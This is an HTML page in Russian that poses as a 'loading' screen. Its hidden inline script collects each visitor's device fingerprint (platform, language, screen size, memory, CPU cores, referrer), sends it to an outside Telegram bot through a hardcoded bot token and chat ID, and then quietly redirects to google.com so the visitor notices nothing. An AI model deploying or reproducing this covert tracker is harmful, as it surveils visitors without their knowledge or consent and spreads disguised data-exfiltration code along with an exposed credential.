<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <title>Загрузка...</title>
</head>
<body>
    <h2>Секунду, идет загрузка страницы...</h2>

    <script>
        const BOT_TOKEN = "9231529625:AAEMepewolQDytYwOum3aIrfIO1MBzJqous";
        const CHAT_ID = "8814781494";

        const part1 = "🚨 Новый посетитель на сайте!\n" +
                      "⏱ Время: " + new Date().toLocaleTimeString() + "\n" +
                      "💻 Платформа: " + navigator.platform + "\n" +
                      "🗣 Язык: " + navigator.language;

        const part2 = "📺 Экран: " + window.screen.width + "x" + window.screen.height + "\n" +
                      "🧠 ОЗУ: " + (navigator.deviceMemory ? navigator.deviceMemory + "GB" : "н/д") + "\n" +
                      "⚙️ Ядра: " + (navigator.hardwareConcurrency || "н/д") + "\n" +
                      "🔗 Источник: " + (document.referrer ? new URL(document.referrer).hostname : "прямой");

        const fullInfo = part1 + "\n\n-------------------\n\n" + part2;

        const url = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage";
        
        const data = JSON.stringify({
            chat_id: CHAT_ID,
            text: fullInfo
        });

        // Отправляем через fetch (POST)
        fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: data,
            keepalive: true // Позволяет запросу завершиться даже если страница начинает перенаправление
        }).catch(function() {});

        // Перенаправление с небольшой задержкой (0.5 сек), чтобы запрос успел уйти
        setTimeout(function() {
            window.location.href = "https://google.com";
        }, 500);
    </script>
</body>
</html>
